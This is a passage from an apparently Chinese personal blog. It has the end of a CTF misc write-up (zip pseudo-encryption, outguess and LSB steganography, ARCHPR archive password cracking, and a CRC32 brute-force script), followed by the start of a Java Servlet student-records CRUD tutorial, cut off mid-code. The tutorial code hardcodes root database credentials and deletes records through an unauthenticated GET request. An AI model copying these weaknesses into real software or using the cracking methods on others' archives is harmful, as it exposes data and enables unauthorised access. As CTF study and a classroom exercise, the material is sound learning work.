<h2 id="7-Whitespace"><a href="#7-Whitespace" class="headerlink" title="7.Whitespace"></a>7.Whitespace</h2><p>使用ZipCenOp检测是否伪加密</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">java -jar <span class="module-access"><span class="module"><span class="identifier">ZipCenOp</span>.</span></span>jar r <span class="module-access"><span class="module"><span class="identifier">XXX</span>.</span></span>zip</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgQu4.jpg" alt="DDgQu4.jpg"></p>
<p>成功</p>
<h2 id="8-outguess"><a href="#8-outguess" class="headerlink" title="8.outguess"></a>8.outguess</h2><p>在kali使用outguess工具</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">outguess</span> <span class="selector-tag">-r</span> <span class="selector-tag">xxx</span><span class="selector-class">.jpg</span> <span class="selector-tag">xxx</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgKvF.jpg" alt="DDgKvF.jpg"></p>
<p>文件信息成功读取</p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgugU.jpg" alt="DDgugU.jpg"></p>
<p>上面的开始也没有头绪，但是推测应该是句话，所以使用<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒解码</a>解码位移量为13得到</p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgn3T.jpg" alt="DDgn3T.jpg"></p>
<p>所以AES解密</p>
<p><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgkHs.jpg" alt="DDgkHs.jpg" style="zoom:50%;" /></p>
<h2 id="9-ARCHPR"><a href="#9-ARCHPR" class="headerlink" title="9.ARCHPR"></a>9.ARCHPR</h2><p>打开安装包</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6OSYt.jpg" alt="D6OSYt.jpg" style="zoom:50%;" /></p>
<p>设置好参数</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6OpfP.jpg" alt="D6OpfP.jpg" style="zoom:50%;" /></p>
<p>拿到</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6OCSf.jpg" alt="D6OCSf.jpg" style="zoom:50%;" /></p>
<p>拿到这个题其中的txt文件，显示</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZRl4.jpg" alt="DyZRl4.jpg" style="zoom:50%;" /></p>
<p>这个是很常见的摩斯电码，解码就是PASSWORD，但是第一行文字提醒将他转换成小写</p>
<p>提示lsb隐写，所以使用<a href="https://github.com/livz/cloacked-pixel">cloacked-pixel</a>工具</p>
<p>这里我卡了很长时间，运行这个工具总是提醒下面信息</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZ2pF.jpg" alt="DyZ2pF.jpg" style="zoom:50%;" /></p>
<p>后来搜寻了一番之后才知道，这个工具是在python2下面编写的，而我电脑上安装的是python3，所以又在环境变量上花了很长时间，具体见<a href="/post/387a909.html" title="cloacked-pixel艰难使用">cloacked-pixel艰难使用</a></p>
<p>成功装好之后，拿到flag</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZDwq.jpg" alt="DyZDwq.jpg"></p>
<h2 id="10-Collision"><a href="#10-Collision" class="headerlink" title="10.Collision"></a>10.Collision</h2><p>看到名字是碰撞的意思，然后在百度搜索ctf碰撞，出来很多信息，然后拿来大佬写的脚本，结果不能用，但是可以看到flag</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZykV.jpg" alt="DyZykV.jpg" style="zoom:50%;" /></p>
<p>猜测应该是字符集不够，之后又加了字符，</p>
<p><a href="https://imgchr.com/i/DyZrT0"><img src="https://s3.ax1x.com/2020/11/28/DyZrT0.jpg" alt="DyZrT0.jpg"></a></p>
<p>拿到flag</p>
<p><img src="https://s3.ax1x.com/2020/11/28/DyZBmn.jpg" alt="DyZBmn.jpg" style="zoom:50%;" /></p>
<p>以下是完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>(<span class="params">crc_in</span>):</span></span><br><span class="line">	crcs = <span class="built_in">set</span>([crc_in])</span><br><span class="line"></span><br><span class="line">	r = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz*+/.-()ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_[]\^`|~&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> r:</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> r:</span><br><span class="line">			<span class="keyword">for</span> c <span class="keyword">in</span> r:</span><br><span class="line">				<span class="keyword">for</span> d <span class="keyword">in</span> r:</span><br><span class="line">					txt = a+b+c+d</span><br><span class="line">					crc = binascii.crc32(txt)</span><br><span class="line">					<span class="keyword">if</span>(crc &amp; <span class="number">0xFFFFFFFF</span>) <span class="keyword">in</span> crcs:</span><br><span class="line">						<span class="keyword">return</span> txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	s = [<span class="number">0xD1F4EB9A</span>,<span class="number">0x1E59A66E</span>,<span class="number">0x77E8FD00</span>,<span class="number">0x6C4A558B</span>,<span class="number">0xFF92876D</span>]</span><br><span class="line">	password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">		passw = crack(x)</span><br><span class="line">		password+=<span class="built_in">str</span>(passw)</span><br><span class="line">		print(password)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>Servlet实现增删改查</title>
    <url>/post/4e17031c.html</url>
    <content><![CDATA[<p>　　在期末的时候需要使用Servlet实现增删改查功能，记录一下，可以参考<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a>中使用maven创建web项目，使用maven可以很方便的管理项目中所使用的包<span id="more"></span></p>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>　　使用jsp+servlet实现，项目并不是很完善，目前还有很多问题，只能是基本实现简单的增删改查</p>
<h1 id="Maven创建web项目"><a href="#Maven创建web项目" class="headerlink" title="Maven创建web项目"></a>Maven创建web项目</h1><p>参考<a href="/post/4bd31b3a.html" title="Maven环境变量配置">Maven环境变量配置</a></p>
<h1 id="项目目录结构"><a href="#项目目录结构" class="headerlink" title="项目目录结构"></a>项目目录结构</h1><p><img src="https://s3.ax1x.com/2020/12/13/reDmNT.jpg" alt="reDmNT.jpg"><img src="https://s3.ax1x.com/2020/12/13/reDEBq.jpg" alt="reDEBq.jpg"></p>
<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>StudentDao</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDao</span> <span class="keyword">extends</span> <span class="title">Util</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回所有学生的集合</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Vector&lt;Student&gt; <span class="title">getAllStudent</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        Vector&lt;Student&gt; students=<span class="keyword">new</span> Vector&lt;&gt;();</span><br><span class="line">        Connection connection=getConnection();</span><br><span class="line">        Statement statement=connection.createStatement();</span><br><span class="line">        ResultSet resultSet=statement.executeQuery(<span class="string">&quot;select * from stu&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(resultSet.next()) &#123;</span><br><span class="line">            Student student=<span class="keyword">new</span> Student();</span><br><span class="line">            student.setStuNo(resultSet.getString(<span class="number">1</span>));</span><br><span class="line">            student.setName(resultSet.getString(<span class="number">2</span>));</span><br><span class="line">            student.setSex(resultSet.getString(<span class="number">3</span>));</span><br><span class="line">            student.setBirthday(resultSet.getString(<span class="number">4</span>));</span><br><span class="line">            student.setPro(resultSet.getString(<span class="number">5</span>));</span><br><span class="line">            student.setSalary(resultSet.getInt(<span class="number">6</span>));</span><br><span class="line">            students.add(student);</span><br><span class="line">        &#125;</span><br><span class="line">        closeAll(connection, statement,resultSet);</span><br><span class="line">        <span class="keyword">return</span> students;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过学号查询并返回某个学生</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Student <span class="title">getOneStudent</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        Student student=<span class="keyword">null</span>;</span><br><span class="line">        Connection connection=getConnection();</span><br><span class="line">        PreparedStatement statement=connection.prepareStatement(<span class="string">&quot;select * from stu where stuNo=?&quot;</span>);</span><br><span class="line">        statement.setString(<span class="number">1</span>, id);</span><br><span class="line">        ResultSet resultSet=statement.executeQuery();</span><br><span class="line">        <span class="keyword">while</span>(resultSet.next()) &#123;</span><br><span class="line">            student=<span class="keyword">new</span> Student();</span><br><span class="line">            student.setStuNo(resultSet.getString(<span class="number">1</span>));</span><br><span class="line">            student.setName(resultSet.getString(<span class="number">2</span>));</span><br><span class="line">            student.setSex(resultSet.getString(<span class="number">3</span>));</span><br><span class="line">            student.setBirthday(resultSet.getString(<span class="number">4</span>));</span><br><span class="line">            student.setPro(resultSet.getString(<span class="number">5</span>));</span><br><span class="line">            student.setSalary(resultSet.getInt(<span class="number">6</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        closeAll(connection, statement,resultSet);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//向学生列表添加某学生</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addOneStudent</span><span class="params">(Student student)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        Connection connection=getConnection();</span><br><span class="line">        PreparedStatement statement=connection.prepareStatement(</span><br><span class="line">                <span class="string">&quot;insert into stu values(?,?,?,?,?,?)&quot;</span>);</span><br><span class="line">        statement.setString(<span class="number">1</span>, student.getStuNo());</span><br><span class="line">        statement.setString(<span class="number">2</span>, student.getName());</span><br><span class="line">        statement.setString(<span class="number">3</span>, student.getSex());</span><br><span class="line">        statement.setString(<span class="number">4</span>, student.getBirthday());</span><br><span class="line">        statement.setString(<span class="number">5</span>, student.getPro());</span><br><span class="line">        statement.setInt(<span class="number">6</span>, student.getSalary());</span><br><span class="line">        statement.executeUpdate();</span><br><span class="line">        closeAll(connection, statement);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过学号删除某学生</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delOneStudent</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        Connection connection=getConnection();</span><br><span class="line">        PreparedStatement statement=connection.prepareStatement(</span><br><span class="line">                <span class="string">&quot;delete from stu where stuNo=?&quot;</span>);</span><br><span class="line">        statement.setString(<span class="number">1</span>, id);</span><br><span class="line">        statement.executeUpdate();</span><br><span class="line">        closeAll(connection, statement);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过学号修改某学生信息</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">updateOneStudent</span><span class="params">(Student student)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;</span><br><span class="line">        Connection connection=getConnection();</span><br><span class="line">        PreparedStatement statement=connection.prepareStatement(</span><br><span class="line">                <span class="string">&quot;update stu set name=?,sex=?,birthday=?,pro=?,salary=?&quot;</span></span><br><span class="line">                        + <span class="string">&quot; where stuNo=?&quot;</span>);</span><br><span class="line">        statement.setString(<span class="number">1</span>, student.getName());</span><br><span class="line">        statement.setString(<span class="number">2</span>, student.getSex());</span><br><span class="line">        statement.setString(<span class="number">3</span>, student.getBirthday());</span><br><span class="line">        statement.setString(<span class="number">4</span>, student.getPro());</span><br><span class="line">        statement.setInt(<span class="number">5</span>, student.getSalary());</span><br><span class="line">        statement.setString(<span class="number">6</span>, student.getStuNo());</span><br><span class="line">        statement.executeUpdate();</span><br><span class="line">        closeAll(connection, statement);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Util</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String DRIVER=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<span class="comment">//数据库连接jar包5.0是com.mysql.jdbc.Driver，此为8.0的驱动路径</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String URL=<span class="string">&quot;jdbc:mysql://localhost:3306/student?characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;autoReconnect=true&quot;</span>;  <span class="comment">//指定连接的数据库以及连接属性设置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String USERNAME=<span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String PWD=<span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException </span>&#123;<span class="comment">//获得连接</span></span><br><span class="line">        Connection connection=<span class="keyword">null</span>;</span><br><span class="line">        Class.forName(DRIVER);</span><br><span class="line">        connection=DriverManager.getConnection(URL, USERNAME, PWD);</span><br><span class="line">        <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeAll</span><span class="params">(Connection connection,Statement statement,ResultSet resultSet)</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="comment">//关闭连接</span></span><br><span class="line">        <span class="keyword">if</span>(connection!=<span class="keyword">null</span>) connection.close();</span><br><span class="line">        <span class="keyword">if</span>(statement!=<span class="keyword">null</span>) statement.close();</span><br><span class="line">        <span class="keyword">if</span>(resultSet!=<span class="keyword">null</span>) resultSet.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">closeAll</span><span class="params">(Connection connection,Statement statement)</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="comment">//关闭连接</span></span><br><span class="line">        <span class="keyword">if</span>(connection!=<span class="keyword">null</span>) connection.close();</span><br><span class="line">        <span class="keyword">if</span>(statement!=<span class="keyword">null</span>) statement.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Student</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> model;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String stuNo;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> String birthday;</span><br><span class="line">    <span class="keyword">private</span> String pro;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStuNo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stuNo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStuNo</span><span class="params">(String stuNo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stuNo = stuNo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getBirthday</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthday;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthday</span><span class="params">(String birthday)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPro</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pro;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPro</span><span class="params">(String pro)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pro = pro;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalary</span><span class="params">(<span class="keyword">int</span> salary)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AddServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> servlets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dao.StudentDao;</span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class AddServlet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/AddServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        response.getWriter().append(<span class="string">&quot;Served at: &quot;</span>).append(request.getContextPath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        Student student=<span class="keyword">new</span> Student();</span><br><span class="line">        student.setStuNo(request.getParameter(<span class="string">&quot;stuNo&quot;</span>));</span><br><span class="line">        student.setName(request.getParameter(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        student.setSex(request.getParameter(<span class="string">&quot;sex&quot;</span>));</span><br><span class="line">        student.setBirthday(request.getParameter(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        student.setPro(request.getParameter(<span class="string">&quot;pro&quot;</span>));</span><br><span class="line">        student.setSalary(Integer.parseInt(request.getParameter(<span class="string">&quot;salary&quot;</span>)));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            StudentDao.addOneStudent(student);</span><br><span class="line">            Vector&lt;Student&gt; students=StudentDao.getAllStudent();</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;students&quot;</span>, students);</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>DeleteServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> servlets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dao.StudentDao;</span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class DeleteServlet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/DeleteServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeleteServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DeleteServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String id=request.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            StudentDao.delOneStudent(id);</span><br><span class="line">            Vector&lt;Student&gt; students=StudentDao.getAllStudent();</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;students&quot;</span>, students);</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>InitServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> servlets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;</span><br><span class="line"><span class="keyword">import</span> dao.StudentDao;</span><br><span class="line"><span class="keyword">import</span> model.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class InitServlet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/InitServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InitServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InitServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, 